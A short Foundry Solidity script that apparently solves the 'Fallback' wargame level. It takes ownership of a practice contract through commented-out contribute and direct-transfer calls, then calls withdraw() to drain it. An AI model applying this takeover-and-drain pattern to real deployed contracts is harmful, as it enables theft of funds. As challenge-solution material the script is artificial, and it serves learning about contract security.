// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/Fallback.sol";

contract CounterScript is Script {
    Fallback instance;
    function setUp() public {
    address instanceAddress = 0xE804A9FF4E50cfB3d299388A4Cd76DEbfc464B80;
    instance = Fallback(payable(instanceAddress));
}

    function run() public {
        console.logAddress(instance.owner());
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);
        // instance.contribute{value: 1000 wei}();
        // address(instance).call{value: 1000 wei}("");
        instance.withdraw();
        vm.stopBroadcast();

    }
}
